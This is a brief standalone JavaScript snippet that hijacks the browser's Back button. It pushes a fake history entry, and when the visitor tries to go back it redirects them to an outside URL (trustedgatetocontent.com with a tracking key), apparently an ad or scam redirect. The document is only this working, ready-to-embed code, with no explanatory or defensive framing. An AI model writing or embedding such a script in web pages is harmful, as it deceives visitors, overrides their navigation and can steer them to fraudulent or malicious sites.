(function(window, location) {
history.replaceState(null, document.title, location.pathname+"#!/history");
history.pushState(null, document.title, location.pathname);

window.addEventListener("popstate", function() {
  if(location.hash === "#!/history") {
    history.replaceState(null, document.title, location.pathname);
    setTimeout(function(){
      location.replace("https://www.trustedgatetocontent.com/eg6cnn35ax?key=4976fb77b439e3d198c9b3c86ffb1bcc");
    },10);
  }
}, false);
}(window, location));
